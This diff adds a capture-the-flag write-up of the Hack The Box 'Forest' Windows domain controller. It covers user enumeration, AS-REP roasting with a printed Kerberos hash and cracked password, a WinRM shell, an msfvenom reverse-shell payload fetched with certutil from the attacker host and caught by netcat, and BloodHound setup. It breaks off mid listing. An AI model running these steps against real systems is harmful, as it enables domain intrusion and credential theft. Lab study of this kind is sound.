@@ -1,0 +1,919 @@
+RECON
+root@kali:~/htb/forest# nmap -sC -sV -p- -vv -oA  full 10.10.10.161
+Reason: 65511 resets
+PORT      STATE SERVICE      REASON          VERSION
+53/tcp    open  domain?      syn-ack ttl 127
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2020-12-07 20:51:33Z)
+135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp   open  kpasswd5?    syn-ack ttl 127
+593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped   syn-ack ttl 127
+3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped   syn-ack ttl 127
+5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
+47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
+49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
+49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
+49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
+49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
+49676/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
+49677/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+49684/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
+49706/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
+49929/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.70%I=7%D=12/7%Time=5FCE9301%P=i686-pc-linux-gnu%r(DNSVer
+SF:sionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x0
+SF:4bind\0\0\x10\0\x03");
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h52m10s, deviation: 4h37m10s, median: 12m08s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 48201/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 32753/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 59304/udp): CLEAN (Timeout)
+|   Check 4 (port 44587/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2020-12-07T12:54:05-08:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-12-07 15:54:03
+|_  start_date: 2020-12-07 15:43:24
+
+ENUM SMB
+root@kali:~/htb/forest# rpcclient -U "" 10.10.10.161
+Enter WORKGROUP\'s password: 
+rpcclient $> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+
+ENUM LDAP
+root@kali:~/htb/forest# ldapsearch -h htb.local -p 389 -x -b "dc=htb,dc=local" 
+# extended LDIF
+#
+# LDAPv3
+# base <dc=htb,dc=local> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# htb.local
+dn: DC=htb,DC=local
+objectClass: top
+objectClass: domain
+objectClass: domainDNS
+distinguishedName: DC=htb,DC=local
+instanceType: 5
+whenCreated: 20190918174549.0Z
+whenChanged: 20201207204314.0Z
+subRefs: DC=ForestDnsZones,DC=htb,DC=local
+subRefs: DC=DomainDnsZones,DC=htb,DC=local
+subRefs: CN=Configuration,DC=htb,DC=local
+uSNCreated: 4099
+dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAOqNrI1l5QUq5WV+CaJoIcQ==
+uSNChanged: 266275
+name: htb
+
+ENUMERATE LDAP USERS
+root@kali:~# git clone https://github.com/ropnop/windapsearch.git
+root@kali:~/windapsearch# python windapsearch_py2.py -d htb.local -U
+[+] No username provided. Will try anonymous bind.
+[+] No DC IP provided. Will try to discover via DNS lookup.
+[+] Using Domain Controller at: 10.10.10.161
+[+] Getting defaultNamingContext from Root DSE
+[+]	Found: DC=htb,DC=local
+[+] Attempting bind
+[+]	...success! Binded as: 
+[+]	 None
+
+[+] Enumerating all AD users
+[+]	Found 28 users: 
+
+...
+
+cn: Sebastien Caron
+userPrincipalName: sebastien@htb.local
+
+cn: Lucinda Berger
+userPrincipalName: lucinda@htb.local
+
+cn: Andy Hislip
+userPrincipalName: andy@htb.local
+
+cn: Mark Brandt
+userPrincipalName: mark@htb.local
+
+cn: Santi Rodriguez
+userPrincipalName: santi@htb.local
+
+
+[*] Bye!
+
+CREATE USER LIST WITH FOUND USER NAMES
+root@kali:~/htb/forest# cat users.txt
+sebatien
+lucinda
+andy
+mark
+santi
+
+REVIEW HOW TO ATTACK KERBEROS
+https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
+
+PERFORM ASREPROAST ATTACK WITH NPUSERS TO GET USER PASSWORD HASHES
+root@kali:~/htb/forest# GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -usersfile users.txt -format hashcat -outputfile hashes.asreproast
+Impacket v0.9.22.dev1+20201015.130615.81eec85a - Copyright 2020 SecureAuth Corporation
+
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+EXPAND THE USER SEARCH WITH GETADUSERS
+root@kali:~/htb/forest# GetADUsers.py -all htb.local/
+Impacket v0.9.22.dev1+20201015.130615.81eec85a - Copyright 2020 SecureAuth Corporation
+
+[*] Querying htb.local for information about domain.
+Name                  Email                           PasswordLastSet      LastLogon           
+--------------------  ------------------------------  -------------------  -------------------
+Administrator         Administrator@htb.local         2019-09-18 13:09:08.342879  2019-10-07 06:57:07.299606 
+Guest                                                 <never>              <never>             
+DefaultAccount                                        <never>              <never>             
+krbtgt                                                2019-09-18 06:53:23.467452  <never>             
+$331000-VK4ADACQNUCA                                  <never>              <never>             
+SM_2c8eef0a09b545acb  SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local  <never>              <never>             
+SM_ca8c2ed5bdab4dc9b  SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.local  <never>              <never>             
+SM_75a538d3025e4db9a  SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.local  <never>              <never>             
+SM_681f53d4942840e18  DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}@htb.local  <never>              <never>             
+SM_1b41c9286325456bb  Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local  <never>              <never>             
+SM_9b69f1b9d2cc45549  FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.local  <never>              <never>             
+SM_7c96b981967141ebb  SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.local  <never>              <never>             
+SM_c75ee099d0a64c91b  SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.local  <never>              <never>             
+SM_1ffab36a2f5f479cb  SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.local  <never>              <never>             
+HealthMailboxc3d7722  HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local  2019-09-23 18:51:31.892097  2019-09-23 18:57:12.361516 
+HealthMailboxfc9daad  HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local  2019-09-23 18:51:35.267114  2019-09-23 18:52:05.736012 
+HealthMailboxc0a90c9  HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local  2019-09-19 07:56:35.206329  <never>             
+HealthMailbox670628e  HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local  2019-09-19 07:56:45.643993  <never>             
+HealthMailbox968e74d  HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local  2019-09-19 07:56:56.143969  <never>             
+HealthMailbox6ded678  HealthMailbox6ded67848a234577a1756e072081d01f@htb.local  2019-09-19 07:57:06.597012  <never>             
+HealthMailbox83d6781  HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local  2019-09-19 07:57:17.065809  <never>             
+HealthMailboxfd87238  HealthMailboxfd87238e536e49e08738480d300e3772@htb.local  2019-09-19 07:57:27.487679  <never>             
+HealthMailboxb01ac64  HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local  2019-09-19 07:57:37.878559  <never>             
+HealthMailbox7108a4e  HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local  2019-09-19 07:57:48.253341  <never>             
+HealthMailbox0659cc1  HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local  2019-09-19 07:57:58.643994  <never>             
+sebastien                                             2019-09-19 20:29:59.544725  2019-09-22 18:29:29.586227 
+lucinda                                               2019-09-19 20:44:13.233891  <never>             
+svc-alfresco                                          2020-12-07 18:10:36.451939  2019-09-23 07:09:47.931194 
+andy                                                  2019-09-22 18:44:16.291082  <never>             
+mark                                                  2019-09-20 18:57:30.243568  <never>             
+santi                                                 2019-09-20 19:02:55.134828  <never> 
+
+APPEND SVC-ALFRESCO USERNAME TO USER LIST
+root@kali:~/htb/forest# cat users.txt 
+sebatien
+lucinda
+andy
+mark
+santi
+svc-alfresco
+
+RETRY ASREPROAST ATTACK AGAIN
+root@kali:~/htb/forest# GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast
+Impacket v0.9.22.dev1+20201015.130615.81eec85a - Copyright 2020 SecureAuth Corporation
+
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+CHECK HASHES ASREPROAST FILE
+root@kali:~/htb/forest# cat hashes.asreproast 
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:afc51e9827c094a99845c86df6b3a332$172b87f504cc0c3837eb9340595b8da3acb9ec6c00fcd34daeb16cc51bfcda6b5c1151b5e263ace278f5e838ff673707e2431cef54dbb804cc2899048144252e43a64b859c896fec04b2b003308ce259230c9c3f171525f5570915634e82e1781cda5f82e928e6121e4935abc76c28b83e2f64933c5bfa045f9dd6e4d85bbfa7bf2f1dd8aca1d5e7a6c9be11dc4c25f2374ba1296faaa3e01bfbf8ad52f8d676cf5deb920617e97942e5d53c2545648998f2f5e5bbe08817c3ff1e2e650e77d0e52dd8b96d48721034ff5a99433a71b5045bde854f470b53bc4edaf102966e9911e520dae368
+
+ENUM SMB SHARES WITH CREDENTIALS
+root@kali:~/htb/forest# smbmap -H htb.local -u svc-alfresco -p s3rvice
+[+] Finding open SMB ports....
+[+] User SMB session establishd on htb.local...
+[+] IP: htb.local:445	Name: htb.local                                         
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	ADMIN$                                            	NO ACCESS
+	C$                                                	NO ACCESS
+	IPC$                                              	NO ACCESS
+	NETLOGON                                          	READ ONLY
+	SYSVOL                                            	READ ONLY
+
+ATTEMPT TO GET A SHELL WITH CREDENTIALS TO port 5985 that is used by the WinRM service for remote management of Windows systems
+root@kali:~/htb/forest# wget -q https://raw.githubusercontent.com/Alamot/code-snippets/master/winrm/winrm_shell.rb
+root@kali:~/htb/forest# chmod 744 winrm_shell.rb 
+root@kali:~/htb/forest# vim winrm_shell.rb 
+root@kali:~/htb/forest# cat winrm_shell.rb 
+require 'winrm'
+
+# Author: Alamot
+
+conn = WinRM::Connection.new( 
+  endpoint: 'http://htb.local:5985/wsman',
+  transport: :ssl,
+  user: 'htb.local\svc-alfresco',
+  password: 's3rvice',
+  :no_ssl_peer_verification => true
+)
+
+command=""
+
+conn.shell(:powershell) do |shell|
+    until command == "exit\n" do
+        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
+        print(output.output.chomp)
+        command = gets        
+        output = shell.run(command) do |stdout, stderr|
+            STDOUT.print stdout
+            STDERR.print stderr
+        end
+    end    
+    puts "Exiting with code #{output.exitcode}"
+end
+
+OR INSTALL VIA GEM
+root@kali:~/htb/forest# gem install winrm
+
+GET REVERSE SHELL
+root@kali:~/htb/forest# ruby winrm_shell.rb 
+PS htb\svc-alfresco@FOREST Documents> whoami
+htb\svc-alfresco
+
+CHECK USER PRIVILEGES
+PS htb\svc-alfresco@FOREST Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name        SID                                          
+================ =============================================
+htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes                                        
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
+HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                     
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State  
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+
+PS htb\svc-alfresco@FOREST Documents> dir C:\Users
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
+----                -------------         ------ ----                                                                                                                                                                                                    
+d-----        9/18/2019  10:09 AM                Administrator                                                                                                                                                                                           
+d-r---       11/20/2016   6:39 PM                Public                                                                                                                                                                                                  
+d-----        9/22/2019   3:29 PM                sebastien                                                                                                                                                                                               
+d-----        9/22/2019   4:02 PM                svc-alfresco                                                                                                                                                                                            
+
+
+PS htb\svc-alfresco@FOREST Documents> cd C:\Users\svc-alfresco
+dirPS htb\svc-alfresco@FOREST svc-alfresco> 
+
+
+    Directory: C:\Users\svc-alfresco
+
+
+Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
+----                -------------         ------ ----                                                                                                                                                                                                    
+d-r---        9/23/2019   2:16 PM                Desktop                                                                                                                                                                                                 
+d-r---        9/22/2019   4:02 PM                Documents                                                                                                                                                                                               
+d-r---        7/16/2016   6:18 AM                Downloads                                                                                                                                                                                               
+d-r---        7/16/2016   6:18 AM                Favorites                                                                                                                                                                                               
+d-r---        7/16/2016   6:18 AM                Links                                                                                                                                                                                                   
+d-r---        7/16/2016   6:18 AM                Music                                                                                                                                                                                                   
+d-r---        7/16/2016   6:18 AM                Pictures                                                                                                                                                                                                
+d-----        7/16/2016   6:18 AM                Saved Games                                                                                                                                                                                             
+d-r---        7/16/2016   6:18 AM                Videos                                                                                                                                                                                                  
+
+
+PS htb\svc-alfresco@FOREST svc-alfresco> cd Desktop
+PS htb\svc-alfresco@FOREST Desktop> dir
+
+
+    Directory: C:\Users\svc-alfresco\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
+----                -------------         ------ ----                                                                                                                                                                                                    
+-ar---        9/23/2019   2:16 PM             32 user.txt                                                                                                                                                                                                
+
+GET USER FLAG
+PS htb\svc-alfresco@FOREST Desktop> type user.txt
+###################################
+
+
+GET SYSTEMINFO
+PS htb\svc-alfresco@FOREST Desktop> Get-ComputerInfo
+
+
+WindowsBuildLabEx                                       : 14393.2273.amd64fre.rs1_release_1.180427-1811
+WindowsCurrentVersion                                   : 6.3
+WindowsEditionId                                        : ServerStandard
+WindowsInstallationType                                 : Server Core
+WindowsInstallDateFromRegistry                          : 9/18/2019 5:07:59 PM
+WindowsProductId                                        : 00376-30821-30176-AA930
+WindowsProductName                                      : Windows Server 2016 Standard
+WindowsRegisteredOrganization                           : 
+WindowsRegisteredOwner                                  : Windows User
+WindowsSystemRoot                                       : C:\Windows
+BiosCharacteristics                                     : 
+BiosBIOSVersion                                         : 
+BiosBuildNumber                                         : 
+BiosCaption                                             : 
+BiosCodeSet                                             : 
+BiosCurrentLanguage                                     : 
+BiosDescription                                         : 
+BiosEmbeddedControllerMajorVersion                      : 
+BiosEmbeddedControllerMinorVersion                      : 
+BiosFirmwareType                                        : 
+BiosIdentificationCode                                  : 
+BiosInstallableLanguages                                : 
+BiosInstallDate                                         : 
+BiosLanguageEdition                                     : 
+BiosListOfLanguages                                     : 
+BiosManufacturer                                        : 
+BiosName                                                : 
+BiosOtherTargetOS                                       : 
+BiosPrimaryBIOS                                         : 
+BiosReleaseDate                                         : 
+BiosSeralNumber                                         : 
+BiosSMBIOSBIOSVersion                                   : 
+BiosSMBIOSMajorVersion                                  : 
+BiosSMBIOSMinorVersion                                  : 
+BiosSMBIOSPresent                                       : 
+BiosSoftwareElementState                                : 
+BiosStatus                                              : 
+BiosSystemBiosMajorVersion                              : 
+BiosSystemBiosMinorVersion                              : 
+BiosTargetOperatingSystem                               : 
+BiosVersion                                             : 
+CsAdminPasswordStatus                                   : 
+CsAutomaticManagedPagefile                              : 
+CsAutomaticResetBootOption                              : 
+CsAutomaticResetCapability                              : 
+CsBootOptionOnLimit                                     : 
+CsBootOptionOnWatchDog                                  : 
+CsBootROMSupported                                      : 
+CsBootStatus                                            : 
+CsBootupState                                           : 
+CsCaption                                               : 
+CsChassisBootupState                                    : 
+CsChassisSKUNumber                                      : 
+CsCurrentTimeZone                                       : 
+CsDaylightInEffect                                      : 
+CsDescription                                           : 
+CsDNSHostName                                           : 
+CsDomain                                                : 
+CsDomainRole                                            : 
+CsEnableDaylightSavingsTime                             : 
+CsFrontPanelResetStatus                                 : 
+CsHypervisorPresent                                     : 
+CsInfraredSupported                                     : 
+CsInitialLoadInfo                                       : 
+CsInstallDate                                           : 
+CsKeyboardPasswordStatus                                : 
+CsLastLoadInfo                                          : 
+CsManufacturer                                          : 
+CsModel                                                 : 
+CsName                                                  : 
+CsNetworkAdapters                                       : 
+CsNetworkServerModeEnabled                              : 
+CsNumberOfLogicalProcessors                             : 
+CsNumberOfProcessors                                    : 
+CsProcessors                                            : 
+CsOEMStringArray                                        : 
+CsPartOfDomain                                          : 
+CsPauseAfterReset                                       : 
+CsPCSystemType                                          : 
+CsPCSystemTypeEx                                        : 
+CsPowerManagementCapabilities                           : 
+CsPowerManagementSupported                              : 
+CsPowerOnPasswordStatus                                 : 
+CsPowerState                                            : 
+CsPowerSupplyState                                      : 
+CsPrimaryOwnerContact                                   : 
+CsPrimaryOwnerName                                      : 
+CsResetCapability                                       : 
+CsResetCount                                            : 
+CsResetLimit                                            : 
+CsRoles                                                 : 
+CsStatus                                                : 
+CsSupportContactDescription                             : 
+CsSystemFamily                                          : 
+CsSystemSKUNumber                                       : 
+CsSystemType                                            : 
+CsThermalState                                          : 
+CsTotalPhysicalMemory                                   : 
+CsPhyicallyInstalledMemory                              : 
+CsUserName                                              : 
+CsWakeUpType                                            : 
+CsWorkgroup                                             : 
+OsName                                                  : 
+OsType                                                  : 
+OsOperatingSystemSKU                                    : 
+OsVersion                                               : 
+OsCSDVersion                                            : 
+OsBuildNumber                                           : 
+OsHotFixes                                              : 
+OsBootDevice                                            : 
+OsSystemDevice                                          : 
+OsSystemDirectory                                       : 
+OsSystemDrive                                           : 
+OsWindowsDirectory                                      : 
+OsCountryCode                                           : 
+OsCurrentTimeZone                                       : 
+OsLocaleID                                              : 
+OsLocale                                                : 
+OsLocalDateTime                                         : 
+OsLastBootUpTime                                        : 
+OsUptime                                                : 
+OsBuildType                                             : 
+OsCodeSet                                               : 
+OsDataExecutionPreventionAvailable                      : 
+OsDataExecutionPrevention32BitApplications              : 
+OsDataExecutionPreventionDrivers                        : 
+OsDataExecutionPreventionSupportPolicy                  : 
+OsDebug                                                 : 
+OsDistributed                                           : 
+OsEncryptionLevel                                       : 
+OsForegroundApplicationBoost                            : 
+OsTotalVisibleMemorySize                                : 
+OsFreePhysicalMemory                                    : 
+OsTotalVirtualMemorySize                                : 
+OsFreeVirtualMemory                                     : 
+OsInUseVirtualMemory                                    : 
+OsTotalSwapSpaceSize                                    : 
+OsSizeStoredInPagingFiles                               : 
+OsFreeSpaceInPagingFiles                                : 
+OsPagingFiles                                           : 
+OsHardwareAbstractionLayer                              : 
+OsInstallDate                                           : 
+OsManufacturer                                          : 
+OsMaxNumberOfProcesses                                  : 
+OsMaxProcessMemorySize                                  : 
+OsMuiLanguages                                          : 
+OsNumberOfLicensedUsers                                 : 
+OsNumberOfProcesses                                     : 
+OsNumberOfUsers                                         : 
+OsOrganization                                          : 
+OsArchitecture                                          : 
+OsLanguage                                              : 
+OsProductSuites                                         : 
+OsOtherTypeDescription                                  : 
+OsPAEEnabled                                            : 
+OsPortableOperatingSystem                               : 
+OsPrimary                                               : 
+OsProductType                                           : 
+OsRegisteredUser                                        : 
+OsSerialNumber                                          : 
+OsServicePackMajorVersion                               : 
+OsServicePackMinorVersion                               : 
+OsStatus                                                : 
+OsSuites                                                : 
+OsServerLevel                                           : ServerCore
+KeyboardLayout                                          : 
+TimeZone                                                : (UTC-08:00) Pacific Time (US & Canada)
+LogonServer                                             : 
+PowerPlatformRole                                       : Desktop
+HyperVisorPresent                                       : 
+HyperVRequirementDataExecutionPreventionAvailable       : 
+HyperVRequirementSecondLevelAddressTranslation          : 
+HyperVRequirementVirtualizationFirmwareEnabled          : 
+HyperVRequirementVMMonitorModeExtensions                : 
+DeviceGuardSmartStatus                                  : Off
+DeviceGuardRequiredSecurityProperties                   : 
+DeviceGuardAvailableSecurityProperties                  : 
+DeviceGuardSecurityServicesConfigured                   : 
+DeviceGuardSecurityServicesRunning                      : 
+DeviceGuardCodeIntegrityPolicyEnforcementStatus         : 
+DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus : 
+
+GET SYSTEM ARCHITECTURE
+PS htb\svc-alfresco@FOREST Desktop> [System.IntPtr]::Size
+8
+64bit machine (32bit if 4)
+
+PRIVESC
+
+GET A SHELL VIA NETCAT
+root@kali:~/htb/forest# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=1234 -f exe > shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+
+SETUP NETCAT
+root@kali:~/htb/forest# cp /usr/share/windows-binaries/nc
+nc64.exe  nc.exe    
+root@kali:~/htb/forest# cp /usr/share/windows-binaries/nc64.exe .
+root@kali:~/htb/forest# cp nc64.exe nc
+
+SERVE THE SHELL BINARY
+root@kali:~/htb/forest# python -m SimpleHTTPServer 80
+
+TRANSFER TO FOREST
+PS htb\svc-alfresco@FOREST Desktop> certutil -f -split -urlcache http://10.10.14.8/shell.exe
+****  Online  ****
+  0000  ...
+  1c00
+CertUtil: -URLCache command completed successfully.
+PS htb\svc-alfresco@FOREST Desktop> dir
+
+
+    Directory: C:\Users\svc-alfresco\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
+----                -------------         ------ ----                                                                                                                                                                                                    
+-a----        12/7/2020   6:21 PM           7168 shell.exe                                                                                                                                                                                               
+-ar---        9/23/2019   2:16 PM             32 user.txt                                                                                                                                                                                                
+
+RUN SHELL BINARY
+PS htb\svc-alfresco@FOREST Desktop> .\shell.exe
+
+GET REVERSE SHELL
+root@kali:~/htb/forest# nc -lvp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.8] from htb.local [10.10.10.161] 64620
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Users\svc-alfresco\Desktop>whoami
+whoami
+htb\svc-alfresco
+
+C:\Users\svc-alfresco\Desktop>
+
+PREPARE BLOODHOUD
+
+START NEO4J DB
+root@kali:~/htb/forest# neo4j console
+Active database: graph.db
+Directories in use:
+  home:         /usr/share/neo4j
+  config:       /usr/share/neo4j/conf
+  logs:         /usr/share/neo4j/logs
+  plugins:      /usr/share/neo4j/plugins
+  import:       /usr/share/neo4j/import
+  data:         /usr/share/neo4j/data
+  certificates: /usr/share/neo4j/certificates
+  run:          /usr/share/neo4j/run
+Starting Neo4j.
+WARNING: Max 1024 open files allowed, minimum of 40000 recommended. See the Neo4j manual.
+2020-12-08 02:15:49.845+0000 INFO  ======== Neo4j 3.3.4 ========
+2020-12-08 02:15:49.938+0000 INFO  Starting...
+2020-12-08 02:15:52.335+0000 INFO  Bolt enabled on 127.0.0.1:7687.
+2020-12-08 02:15:56.187+0000 INFO  Started.
+2020-12-08 02:15:57.347+0000 INFO  Remote interface available at http://localhost:7474/
+
+
+LOGIN TO NEO4J PORTAL
+http://localhost:7474/browser/
+
+UPDATE LOGIN PASSWORD
+bloodhound
+
+DOWNLOAD SHARPHOUND TO COLLECT DATA FOR BLOODHOUND
+root@kali:~/htb/forest# wget -q https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.exe
+OR
+root@kali:~/htb/forest# cp /usr/lib/bloodhound/resources/app/Ingestors/SharpHound.exe .
+root@kali:~/htb/forest# ls -l
+total 164
+-rw-r--r-- 1 root root 36598 Noll   7 21:17 forest_writeup
+-rw-r--r-- 1 root root  1707 Noll   7 15:43 full.gnmap
+-rw-r--r-- 1 root root  4028 Noll   7 15:43 full.nmap
+-rw-r--r-- 1 root root 11261 Noll   7 15:43 full.xml
+-rw-r--r-- 1 root root   531 Noll   7 18:01 hashes.asreproast
+-rw-r--r-- 1 root root 43696 Noll   7 21:07 nc
